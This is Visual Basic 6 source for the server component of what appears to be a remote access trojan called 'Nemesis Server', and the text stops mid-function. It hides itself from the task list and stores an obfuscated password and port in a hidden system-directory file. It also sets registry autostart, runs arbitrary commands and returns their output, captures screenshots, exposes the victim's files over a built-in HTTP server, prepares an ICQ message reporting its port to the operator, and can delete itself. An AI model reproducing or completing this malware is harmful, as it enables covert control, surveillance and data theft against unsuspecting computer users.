VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   ClientHeight    =   3525
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3975
   ClipControls    =   0   'False
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   235
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   265
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock sckHTTP 
      Index           =   0
      Left            =   120
      Top             =   1560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton PassOff 
      CausesValidation=   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   120
      TabIndex        =   2
      TabStop         =   0   'False
      Top             =   3600
      Visible         =   0   'False
      Width           =   225
   End
   Begin MSWinsockLib.Winsock sckIn 
      Index           =   0
      Left            =   120
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckOut 
      Index           =   0
      Left            =   600
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrOnTop 
      Enabled         =   0   'False
      Interval        =   55
      Left            =   600
      Top             =   1560
   End
   Begin MSWinsockLib.Winsock sckICQ 
      Left            =   600
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckDRV 
      Left            =   120
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckFT 
      Left            =   600
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sckTCP 
      Left            =   120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox txtBar 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   60
      TabIndex        =   1
      Top             =   3180
      Width           =   3855
   End
   Begin VB.TextBox txtChat 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3075
      Left            =   60
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   60
      Width           =   3855
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Sub - KERNEL32.DLL
Private Declare Sub GlobalMemoryStatus Lib "kernel32" (lpBuffer As MEMORYSTATUS)

'Sub - SHELL32.DLL
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)

'Sub - VBKeyHook.DLL
Private Declare Sub RemoveHook Lib "VBKeyHook.Dll" ()
Private Declare Sub InstallHook Lib "VBKeyHook.Dll" (ByVal hwnd As Long)

'Function - ADVAPI32.DLL
Private Declare Function RegOpenKeyA Lib "advapi32" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Private Declare Function GetUserNameA Lib "advapi32" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function RegCreateKeyA Lib "advapi32" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function RegQueryValueExA Lib "advapi32" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function LookupPrivilegeValueA Lib "advapi32" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LUID) As Long
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long

'Function - KERNEL32.DLL
Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As String, ByVal nNumberOfBytesToRead As Long, lpNumberOfbytes_read As Long, ByVal lpOverlapped As Any) As Long
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
Private Declare Function CreatePipe Lib "kernel32" (phReadPipe As Long, phWritePipe As Long, lpPipeAttributes As Any, ByVal nSize As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Function FindNextFileA Lib "kernel32" (ByVal hFindFile As Long, ByRef lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function FindFirstFileA Lib "kernel32" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, lpProcessAttributes As SECURITY_ATTRIBUTES, lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function SetVolumeLabelA Lib "kernel32" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function GetComputerNameA Lib "kernel32" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpRootPathName As String, lpFreeBytesAvailableToCaller As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
Private Declare Function GetSystemDirectoryA Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowsDirectoryA Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetVolumeInformationA Lib "kernel32" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Private Declare Function GetPrivateProfileStringA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Private Declare Function WritePrivateProfileStringA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long

'Function - SHELL32.DLL
Private Declare Function ShellExecuteA Lib "shell32" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function SHFileOperationA Lib "shell32" (lpFileOp As SHFILEOPSTRUCT) As Long

'Function - SHLWAPI.DLL
Private Declare Function PathMatchSpecW Lib "shlwapi" (ByVal pszFileParam As Long, ByVal pszSpec As Long) As Long

'Function - USER32.DLL
Private Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Integer, ByVal wFlags As Integer) As Integer
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function EnumWindows Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Private Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long
Private Declare Function FindWindowA Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Private Declare Function PostMessageA Lib "user32" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function SetSysColors Lib "user32" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function SendMessageA Lib "user32" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Long, ByVal bRevert As Integer) As Integer
Private Declare Function FindWindowExA Lib "user32" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal dwOptions As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetWindowTextA Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function SetWindowTextA Lib "user32" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function SystemParametersInfoA Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long

'Function - WINMM.DLL
Private Declare Function sndPlaySoundA Lib "winmm" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Private Declare Function mciSendStringA Lib "winmm" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long

'Type
Private fp As FILE_PARAMS
Private Type FILE_PARAMS
   bRecurse As Boolean
   sFileNameExt As String
   iFileCount As Integer
   sFiles As String
End Type
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Type LUID
    UsedPart As Long
    IgnoredForNowHigh32BitPart As Long
End Type
Private Type MEMORYSTATUS
    dwLength As Long
    dwMemoryLoad As Long
    dwTotalPhys As Long
    dwAvailPhys As Long
    dwTotalPageFile As Long
    dwAvailPageFile As Long
    dwTotalVirtual As Long
    dwAvailVirtual As Long
End Type
Private Type OSVERSIONINFO
    dwOsVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type
Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type
Private Type SHFILEOPSTRUCT
    hwnd As Long
    wFunc As Long
    pFrom As String
    pTo As String
    fFlags As Integer
    fAnyOperationsAborted As Long
    hNameMappings As Long
    lpszProgressTitle As Long
End Type
Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type
Private Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    TheLuid As LUID
    Attributes As Long
End Type
Private Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 260
    cAlternate As String * 14
End Type

'Const
Private Const RunKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
Private Const RunServicesKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\"

'HTTP Const
Private Const httpDocType = "<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN"">" & vbNewLine & "<HTML><HEAD>"
Private Const httpHeadBody = "<STYLE TYPE=""TEXT/CSS"">A:HOVER {COLOR: #FF0000} A {TEXT-DECORATION: NONE}</STYLE><META HTTP-EQUIV=CONTENT-TYPE CONTENT=""TEXT/HTML; CHARSET=WINDOWS-1252""></HEAD><BODY LINK=""#0000CC"" VLINK=""#0000CC"">"
Private Const httpTable = vbNewLine & vbNewLine & "<TABLE WIDTH=""100%"" BORDER=""0"" CELLSPACING=""0"">" & vbNewLine

'Boolean
Private WinVer As Boolean
Private KeyHook As Boolean
Private RegRunOn As Boolean
Private Connected As Boolean
Private ScreenShot As Boolean
Private PasswordOn As Boolean
Private RegRunServiceOn As Boolean

'String
Private Password As String
Private strSrvNFO As String
Private strFileName As String
Private CurrentWindow As String
Private PortConnections(15) As String

'Drive Information
Private m_Size As String
Private m_Label As String
Private m_FreeSpace As String
Private m_UsedSpace As String
Private m_FileSystem As String
Private m_SerialNumber As String

'Integer
Private intMax As Integer
Private PortNum As Integer
Private HitCounter As Integer

'Long
Private ICQNum As Long
Private WindowhWnd As Long
Private lngFileProg As Long
Private lngFileSize As Long
Private Processes(150) As Long
Private DefaultColor(4) As Long

Private Sub Form_Load()
    On Error Resume Next
    
    WinVer = WinVersion
    If WinVer Then
        RegisterServiceProcess 0, 1
    End If
    App.TaskVisible = False
    
    LoadSrvNFO

    Err = 0
    sckTCP.Listen
    If Err <> 0 Then
        Unload Me
    End If
    
    sckHTTP(0).LocalPort = 80
    sckHTTP(0).Listen
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    Dim I As Long, intForLoop As Long
    sckFT.Close
    sckDRV.Close
    sckTCP.Close
    sckICQ.Close
    intForLoop = sckIn.UBound
    For I = 0 To intForLoop
        sckIn(I).Close
    Next
    intForLoop = sckOut.UBound
    For I = 0 To intForLoop
        sckOut(I).Close
    Next
    intForLoop = sckHTTP.UBound
    For I = 0 To intForLoop
        sckHTTP(I).Close
    Next
    Set frmServer = Nothing
    Erase PortConnections
    Erase DefaultColor
    Erase Processes
End Sub

Private Function ReadINI(ByVal sSection As String, ByVal sKeyName As String, ByVal sFileName As String) As String
    On Error Resume Next
    Dim sRet As String

    sRet = String(255, vbNullChar)
    ReadINI = Left$(sRet, GetPrivateProfileStringA(sSection, ByVal sKeyName, "", sRet, Len(sRet), sFileName))
End Function

Private Sub WriteINI(ByVal sSection As String, ByVal sKeyName As String, ByVal sNewString As String, ByVal sFileName As String)
    On Error Resume Next
    WritePrivateProfileStringA sSection, sKeyName, sNewString, sFileName
End Sub

Private Sub LoadSrvNFO()
    On Error Resume Next
    
    DefaultColor(0) = GetSysColor(8)
    DefaultColor(1) = GetSysColor(15)
    DefaultColor(2) = GetSysColor(4)
    DefaultColor(3) = GetSysColor(1)
    DefaultColor(4) = GetSysColor(5)
    
    strSrvNFO = GetSysPath & "\snd32.drv"
    If FileExists(strSrvNFO) = False Then
        WriteINI "Settings", "PortNum", Encrypt("6116"), strSrvNFO
        WriteINI "Settings", "ICQNum", Encrypt("176066065"), strSrvNFO
        WriteINI "Settings", "Password", Encrypt("BuffyTheVampireSlayer"), strSrvNFO
        WriteINI "Settings", "RegRun", Encrypt("0"), strSrvNFO
        WriteINI "Settings", "RegServices", Encrypt("1"), strSrvNFO
        SetAttr strSrvNFO, vbHidden
    End If
    PortNum = Decrypt(ReadINI("Settings", "PortNum", strSrvNFO))
    sckTCP.LocalPort = PortNum
    ICQNum = Decrypt(ReadINI("Settings", "ICQNum", strSrvNFO))
    If Len(ICQNum) Then
        'sckICQ.Connect "wwp.mirabilis.com", 80
    End If
    Password = Decrypt(ReadINI("Settings", "Password", strSrvNFO))
    PasswordOn = Len(Password)
    RegRunOn = Decrypt(ReadINI("Settings", "RegRun", strSrvNFO))
    RegRunServiceOn = Decrypt(ReadINI("Settings", "RegServices", strSrvNFO))
End Sub

Private Function GetStringKey(ByVal hKey As Long, ByVal strPath As String, ByVal strValue As String) As String
    On Error Resume Next
    Dim retValue As Long
    
    RegOpenKeyA hKey, strPath, retValue
    GetStringKey = RegQueryStringValue(retValue, strValue)
    RegCloseKey retValue
End Function

Private Function RegQueryStringValue(ByVal hKey As Long, ByVal strValueName As String) As String
    On Error Resume Next
    Dim lResult As Long, lValueType As Long, strBuf As String, lDataBufSize As Long
   
    lResult = RegQueryValueExA(hKey, strValueName, 0, lValueType, ByVal 0, lDataBufSize)
    If lResult = 0 Then
        If lValueType = 1 Then
            strBuf = String(lDataBufSize, vbNullChar)
            lResult = RegQueryValueExA(hKey, strValueName, 0, 0, ByVal strBuf, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = Left$(strBuf, InStr(1, strBuf, vbNullChar) - 1)
            End If
        ElseIf lValueType = 3 Then
            Dim strData As Integer
            lResult = RegQueryValueExA(hKey, strValueName, 0, 0, strData, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = strData
            End If
        End If
    End If
End Function

Private Sub SaveStringKey(ByVal strPath As String, ByVal strValue As String, ByVal strData As String)
    On Error Resume Next
    Dim retValue As Long
    
    RegCreateKeyA -2147483647, strPath, retValue
    RegSetValueExA retValue, strValue, 0, 4, CLng(strData$), 4
    RegCloseKey retValue
End Sub

Private Sub RegRunService(ByVal Remove As Boolean)
    On Error Resume Next
    Dim Reg As Object

    Set Reg = CreateObject("Wscript.Shell")
    If Remove Then
        Reg.RegWrite RunServicesKey & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
    ElseIf RegRunServiceOn Then
        RegRunServiceOn = False
        WriteINI "Settings", "RegServices", Encrypt("0"), strSrvNFO
        Reg.RegDelete RunServicesKey & App.EXEName
    End If
End Sub

Private Sub RegRun(ByVal Remove As Boolean)
    On Error Resume Next
    Dim Reg As Object
    
    Set Reg = CreateObject("Wscript.Shell")
    If Remove Then
        Reg.RegWrite RunKey & App.EXEName, App.Path & "\" & App.EXEName & ".exe"
    ElseIf RegRunOn Then
        RegRunOn = False
        WriteINI "Settings", "RegRun", Encrypt("0"), strSrvNFO
        Reg.RegDelete RunKey & App.EXEName
    End If
End Sub

Private Function WinVersion() As Boolean
    On Error Resume Next
    Dim vInfo As OSVERSIONINFO
    
    vInfo.dwOsVersionInfoSize = Len(vInfo)
    If GetVersionExA(vInfo) <> 0 Then
        If vInfo.dwPlatformId = 1 Then
            WinVersion = True
        End If
    End If
End Function

Private Function StripNulls(ByVal OriginalStr As String) As String
    On Error Resume Next
    If (InStr(OriginalStr, vbNullChar) > 0) Then
        StripNulls = Left$(OriginalStr, InStr(OriginalStr, vbNullChar) - 1)
    End If
End Function

Private Function FileExists(ByVal strFileName As String) As Boolean
    On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long
       
    hFile = FindFirstFileA(strFileName, WFD)
    FileExists = hFile <> -1
    FindClose hFile
End Function

Private Function ICQMessage(ByVal ICQNum As Long) As String
    On Error Resume Next
    Dim cData As String
    
    cData = "from=Nemesis" & "&fromemail=Server" & "&subject=Nemesis Server" & "&body=" & "Remote Port: (" & sckTCP.LocalPort & ")" & "&to=" & ICQNum & "&Send=" & vbNullString
    ICQMessage = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbNewLine & "Referer: http://wwp.mirabilis.com" & vbNewLine & "User-Agent: Mozilla/4.06 (Win95; I)" & vbNewLine & "Connection: Keep -Alive" & vbNewLine & "Host: wwp.mirabilis.com:80" & vbNewLine & "Content-type: application/x-www-form-urlencoded" & vbNewLine & "Content-length: " & Len(cData) & vbNewLine & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbNewLine & vbNewLine & cData
End Function

Private Function Encrypt(ByVal strData As String) As String
    On Error Resume Next
    Dim X As Integer, intLoop As Integer
    
    Encrypt = strData
    intLoop = Len(Encrypt)
    For X = 1 To intLoop
        If Int(X \ 2) = X \ 2 Then
            Mid$(Encrypt, X, 1) = Chr$(Asc(Mid$(Encrypt, X, 1)) + 10)
        Else
            Mid$(Encrypt, X, 1) = Chr$(Asc(Mid$(Encrypt, X, 1)) + 20)
        End If
        DoEvents
    Next
End Function

Private Function Decrypt(ByVal strData As String) As String
    On Error Resume Next
    Dim X As Integer, intLoop As Integer
    
    Decrypt = strData
    intLoop = Len(Decrypt)
    For X = 1 To intLoop
        If Int(X \ 2) = X \ 2 Then
            Mid$(Decrypt, X, 1) = Chr$(Asc(Mid$(Decrypt, X, 1)) - 10)
        Else
            Mid$(Decrypt, X, 1) = Chr$(Asc(Mid$(Decrypt, X, 1)) - 20)
        End If
        DoEvents
    Next
End Function

Private Function ExecuteCommand(ByVal mCommand As String) As String
    On Error Resume Next
    Dim proc As PROCESS_INFORMATION, start As STARTUPINFO, sa As SECURITY_ATTRIBUTES, ret As Long, hReadPipe As Long, hWritePipe As Long, lngBytesread As Long, strBuff As String * 256, mOutputs As String
    
    If LenB(mCommand) = 0 Then
        Exit Function
    End If
    sa.nLength = Len(sa)
    sa.bInheritHandle = 1
    sa.lpSecurityDescriptor = 0
    If CreatePipe(hReadPipe, hWritePipe, sa, 0) = 0 Then
        Exit Function
    End If
    start.cb = Len(start)
    start.dwFlags = 257
    start.hStdOutput = hWritePipe
    start.hStdError = hWritePipe
    If CreateProcessA(0, mCommand, sa, sa, 1, 32, 0, 0, start, proc) <> 1 Then
        Exit Function
    End If
    CloseHandle hWritePipe
    mOutputs = vbNullString
    Do
        ret = ReadFile(hReadPipe, strBuff, 256, lngBytesread, 0&)
        mOutputs = mOutputs & Left$(strBuff, lngBytesread)
        DoEvents
    Loop While ret <> 0
    CloseHandle proc.hProcess
    CloseHandle proc.hThread
    CloseHandle hReadPipe
    ExecuteCommand = mOutputs
End Function

Private Sub AdjustToken()
    On Error Resume Next
    Dim hdlProcessHandle As Long, hdlTokenHandle As Long, lBufferNeeded As Long, tmpLuid As LUID, tkp As TOKEN_PRIVILEGES, tkpNewButIgnored As TOKEN_PRIVILEGES
    
    hdlProcessHandle = GetCurrentProcess()
    OpenProcessToken hdlProcessHandle, (40), hdlTokenHandle
    LookupPrivilegeValueA vbNullString, "SeShutdownPrivilege", tmpLuid
    tkp.PrivilegeCount = 1
    tkp.TheLuid = tmpLuid
    tkp.Attributes = 2
    AdjustTokenPrivileges hdlTokenHandle, False, tkp, Len(tkpNewButIgnored), tkpNewButIgnored, lBufferNeeded
End Sub

Private Sub PassCheck(ByVal strPass As String)
    On Error Resume Next
    If strPass <> Password Then
        sckTCP.SendData "05"
    Else
        sckFT.Close
        sckFT.LocalPort = 0
        sckFT.Listen
        sckTCP.SendData "15" & sckFT.LocalPort & "|" & ICQNum
    End If
End Sub

Private Sub SentKeys(ByVal strWindowName As String, ByVal strKeys As String)
    On Error Resume Next
    ShowWindow WindowhWnd, 9
    AppActivate strWindowName
    SendKeys strKeys
End Sub

Private Sub InitChat(ByVal Percent As Integer)
    On Error Resume Next
    Dim WW As Integer, HH As Integer

    sckTCP.SendData "02"
    If Percent > 100 Then
        Percent = 100
    End If
    WW = (Screen.Width * Percent) \ 100
    HH = (Screen.Height * Percent) \ 100
    Me.Width = WW
    Me.Height = HH
    WW = (WW \ Screen.TwipsPerPixelX) - 8
    HH = (HH \ Screen.TwipsPerPixelY) - 30
    With txtChat
        .Text = vbNullString
        .Height = HH
        .Width = WW
        .Left = 4
        .Top = 4
    End With
    With txtBar
        .Text = vbNullString
        .Width = WW
        .Top = txtChat.Height + 7
    End With
    Me.Move (Screen.Width - Width) \ 2, (Screen.Height - Height) \ 2
    Me.Visible = True
    Me.SetFocus
    SetWindowPos hwnd, -1, 0, 0, 0, 0, 3
    tmrOnTop.Enabled = True
End Sub

Private Sub RemoveServer()
    On Error Resume Next
    Dim strBATData As String, strKillName As String, intFile As Integer

    strKillName = App.Path & "\Kill.bat"
    strBATData = "Del """ & App.Path & "\" & App.EXEName & ".exe"" /F /Q" & vbNewLine & "Del """ & strKillName & """ /F /Q"
    intFile = FreeFile
    Open strKillName For Binary Access Write As intFile
        Put intFile, , strBATData
    Close intFile
    ShellExecuteA Me.hwnd, vbNullString, strKillName, vbNullString, vbNullString, 0
    Unload Me
End Sub

Private Sub InitCapture()
    On Error GoTo ErrHandle
    Dim ClipData As String
    
    ClipData = Clipboard.GetText
    strFileName = App.Path & "\Temp.dat"
    ScreenShot = True
    keybd_event vbKeySnapshot, WinVer, 0, 0
    DoEvents
    SavePicture Clipboard.GetData(2), strFileName
    lngFileProg = 0
    sckFT.SendData "SEND_FILEScreenShot" & "|" & FileLen(strFileName)
    Clipboard.SetText ClipData
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub HTTPSearch(ByVal sRoot As String)
    On Error Resume Next
    Dim WFD As WIN32_FIND_DATA
    Dim hFile As Long, tmpString As String, picFile As String, intFileSize As Long, strFileSize As String
    
    hFile = FindFirstFileA(sRoot & "*.*", WFD)
    
    If hFile <> -1 Then
        Do
            If (WFD.dwFileAttributes And vbDirectory) Then
                If AscW(WFD.cFileName) <> 46 Then
                    If fp.bRecurse Then
                        HTTPSearch sRoot & StripNulls(WFD.cFileName) & "\"
                    End If
                End If
            Else
                If MatchSpec(WFD.cFileName, fp.sFileNameExt) Then
                    tmpString = StripNulls(WFD.cFileName)
                    Select Case LCase$(Mid$(tmpString, InStrRev(tmpString, ".") + 1))
                        Case "exe", "bat", "com", "scr"
                            picFile = "Executable.gif"
                        Case "sys", "dll", "vxd", "cpl"
                            picFile = "System.gif"
                        Case "mp3", "midi", "wav", "ram"
                            picFile = "Audio.gif"
                        Case "mpeg", "mpg", "avi", "asf", "rm", "swf", "wmv", "wma", "asx", "vob", "mov"
                            picFile = "Video.gif"
                        Case "jpg", "gif", "png", "bmp", "pdf", "pcx", "tif", "psd"
                            picFile = "Image.gif"
                        Case "txt", "log", "doc", "dat", "htm", "html", "rtf", "cfg", "nfo", "vbs"
                            picFile = "Text.gif"
                        Case Else
                        picFile = "Unknown.gif"
                    End Select
                    intFileSize = (WFD.nFileSizeLow \ 1024)
                    If intFileSize <> 0 Then
                        strFileSize = Format$(intFileSize, "###,###,###")
                    Else
                        strFileSize = 0
                    End If
                    fp.sFiles = fp.sFiles & "<TR><TD><IMG SRC=""" & picFile & """ ALT=""" & tmpString & """> <A HREF=""/?" & sRoot & tmpString & """>" & sRoot & tmpString & "</A></TD><TD WIDTH =""40%"">Size: " & strFileSize & " KB</TD></TR>" & vbNewLine
                End If
            End If
            DoEvents
        Loop While FindNextFileA(hFile, WFD)
    End If
    FindClose hFile
End Sub

Private Function GetDrives() As String
    On Error Resume Next
    Dim FSO As FileSystemObject, Drive As Drive
    
    GetDrives = "<TR><TD><IMG SRC=""Control.gif"" ALT=""Control Panel""> <A HREF=""Control.html"">Control Panel</A><HR></TD></TR>" & vbNewLine & vbNewLine
    Set FSO = CreateObject("Scripting.FileSystemObject")
    For Each Drive In FSO.Drives
        Select Case Drive.DriveType
            Case 0
            GetDrives = GetDrives & "<TR><TD><IMG SRC=""UnknownDRV.gif"" ALT=""" & Drive & """> <A HREF=""?" & Drive & "\"">" & Drive & "\ - Unknown Drive" & "</A></TD></TR>" & vbNewLine
            Case 1
            GetDrives = GetDrives & "<TR><TD><IMG SRC=""Removable.gif"" ALT=""" & Drive & """> <A HREF=""?" & Drive & "\"">" & Drive & "\ - Removable Disk" & "</A></TD></TR>" & vbNewLine
            Case 2
